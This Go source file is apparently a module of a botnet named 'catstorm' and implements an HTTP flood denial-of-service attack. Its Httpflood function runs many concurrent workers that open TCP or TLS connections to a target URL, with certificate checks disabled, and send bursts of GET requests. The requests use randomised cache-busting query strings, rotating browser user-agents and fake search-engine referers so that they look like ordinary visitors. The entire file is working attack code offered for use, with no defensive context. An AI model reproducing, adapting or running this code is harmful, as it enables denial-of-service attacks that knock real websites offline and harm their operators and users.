package l7

import (
	"catstorm/Bot/Methods"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"time"
)

var httpUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
	"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.10.289 Version/12.02",
	"Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/115.0",
}

var httpReferers = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://search.yahoo.com/search?p=",
	"https://www.baidu.com/s?wd=",
	"https://duckduckgo.com/?q=",
}

func Httpflood(ctx context.Context, raw string, sec int) {
	u, er := url.Parse(raw)
	if er != nil {
		return
	}

	isTLS := u.Scheme == "https"
	tgtPort := u.Port()
	if tgtPort == "" {
		tgtPort = "80"
		if isTLS {
			tgtPort = "443"
		}
	}

	path := u.Path
	if path == "" {
		path = "/"
	}

	for i := 0; i < methods.Workers(); i++ {
		go func() {
			rng := methods.NewXorShift64()
			buf := make([]byte, 1024)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				conn, er := net.DialTimeout("tcp", net.JoinHostPort(u.Hostname(), tgtPort), 10*time.Second)
				if er != nil {
					time.Sleep(10 * time.Millisecond)
					continue
				}

				var writeConn net.Conn = conn
				if isTLS {
					tlsConfig := &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         u.Hostname(),
						MinVersion:         tls.VersionTLS12,
					}
					tlsConn := tls.Client(conn, tlsConfig)
					if er := tlsConn.Handshake(); er != nil {
						conn.Close()
						continue
					}
					writeConn = tlsConn
				}

				bursts := 5 + int(rng.Uint64()%16)
				for j := 0; j < bursts; j++ {
				ua := httpUserAgents[int(rng.Uint64()%uint64(len(httpUserAgents)))]
				referer := httpReferers[int(rng.Uint64()%uint64(len(httpReferers)))]
				q := fmt.Sprintf("%016x", rng.Uint64())
				randPath := fmt.Sprintf("%s?%s=%s", path, q[:8], q[8:16])

					headers := fmt.Sprintf("GET %s HTTP/1.1\r\n", randPath)
					headers += fmt.Sprintf("Host: %s\r\n", u.Host)
					headers += fmt.Sprintf("User-Agent: %s\r\n", ua)
					headers += fmt.Sprintf("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
					headers += fmt.Sprintf("Accept-Language: en-US,en;q=0.5\r\n")
					headers += fmt.Sprintf("Accept-Encoding: gzip, deflate\r\n")
					headers += fmt.Sprintf("Referer: %s%s\r\n", referer, q[:12])
					headers += fmt.Sprintf("Cache-Control: no-cache\r\n")
					headers += fmt.Sprintf("Connection: keep-alive\r\n")
					headers += fmt.Sprintf("\r\n")

					writeConn.SetWriteDeadline(time.Now().Add(2 * time.Second))
					if _, er := writeConn.Write([]byte(headers)); er != nil {
						break
					}

					if j%3 == 0 {
						writeConn.SetReadDeadline(time.Now().Add(30 * time.Millisecond))
						writeConn.Read(buf)
					}
				}

				if tcp, ok := writeConn.(*net.TCPConn); ok {
					tcp.SetLinger(0)
				} else if tlsConn, ok := writeConn.(*tls.Conn); ok {
					if tcp, ok := tlsConn.NetConn().(*net.TCPConn); ok {
						tcp.SetLinger(0)
					}
				}
				writeConn.Close()
			}
		}()
	}
	<-ctx.Done()
}
